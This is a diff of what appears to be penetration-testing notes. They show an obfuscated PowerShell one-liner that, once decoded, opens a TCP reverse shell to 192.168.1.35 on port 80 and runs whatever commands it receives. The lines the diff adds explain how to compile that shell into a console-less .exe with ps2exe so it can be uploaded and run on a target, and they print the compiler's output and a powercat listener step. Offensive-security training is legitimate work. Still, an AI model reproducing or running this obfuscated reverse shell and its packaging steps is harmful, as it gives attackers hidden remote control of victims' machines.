@@ -563,6 +563,18 @@ PS C:\Users\auditor\>
 PS C:\Users\auditor\>&((Gv '*MDr*').NAme[3,11,2]-jOIN'')( ((("{23}{5}{14}{18}{31}{3}{9}{4}{7}{19}{28}{13}{29}{12}{22}{35}{32}{2}{0}{33}{11}{21}{30}{8}{15}{20}{16}{26}{34}{25}{1}{24}{17}{27}{6}{10}" -f 'nd (SfLps -','endback + SfLprompt + 4rT> 4rT;SfL','Litem -eq 4rTSfLps4rT) -a','m.Net.Sockets.TC','tip,SfLport);Sf','Lps=SfLfalse;SfLhostip=4rT192.','stream.Write(SfLsen','Lstream = SfLclient',' SfLmyArra','PClient(SfLhos','dbyte,0,SfLsendbyte.Length);SfLstream.Flush()};SfLclient.Close()}','wd4rT,4rTls4rT,4rTps4rT,4rTrm4rT,4r','SfLd','003mA%{0};while((SfLi = SfLstream.Read(SfLbytes, 0, SfLbytes.Length)) ','168.1.354rT;S','y){if(SfLitem -eq SfLi){SfLdo=SfLtrue}}if(SfLdo -or SfLps){SfLsendback=(','+','dbyte = ([text.encoding]::ASCII).GetBytes(SfLsendbac','fLport=80;SfLclient = New-Object Sys','.GetStream();[',' iex SfLdata 2>&1 3mAOut-String)}else{SfLdata2=4rT/c 4rT','Tcp4rT,4rTmv4rT,4rTcat4r','ata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString','& {Sf','sen',' = SfLdata + SfLs','SfLdata;SfLsendback = ( &SfLcmd SfLdata2 2>&1 3mA Out-String)};if(SfLps){SfLprompt=4','k2);SfL','byte[]]SfLbytes = 0..500','-ne 0){','T);SfLdo=SfLfalse;foreach (SfLi in','te','LinArray[0];if((Sf','eq SfLfalse)){SfLps=SfLtrue}if(SfLitem -like 4rT?:4rT){SfLitem=4rTd:4rT}SfLmyArray=@(4rTcd4rT,4rTexit4rT,4rTd:4rT,4rTp','rTPS 4rT + (pwd).Path}else{SfLprompt=(pwd).Path}SfLsendback2','(SfLbytes,0, SfLi);SfLcmd=(get-childitem Env:ComSpec).value;SfLinArray=SfLdata.split();SfLitem=Sf')) -crEpLACE  ([cHaR]52+[cHaR]114+[cHaR]84),[cHaR]39  -rePLACE 'SfL',[cHaR]36  -crEpLACE'3mA',[cHaR]124) )
 
 
+Note:
+-----
+> We could also create an .exe file containing our obfuscated powershell reverse shell using the script 'ps2exe.ps1' and then upload and execute it on our target.
+
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> ./ps2exe.ps1 -inputFile 'Test-reverse.ps1' -outputFile 'Test-reverse.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS
+PS2EXE-GUI v0.5.0.26 by Ingo Karstein, reworked and GUI support by Markus Scholtes
+You are using PowerShell 4.0 or above.
+Reading input file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.ps1
+Compiling file...
+Output file C:\Users\Administrator.PO718687\Documents\Tools-AD\Test-reverse.exe written
+
+
 => On our attacker machine
 --------------------------------------------------------------------------------------------------------------
 PS C:\Users\Administrator\Documents\Tools-AD> . .\powercat.ps1
@@ -629,6 +641,8 @@ PSComputerName                   :
 
 C:\Users\auditor> exit
 VERBOSE: Failed to redirect data from Stream 1 to Stream 2
+
+
 
 
 ===================================================================================================================================================
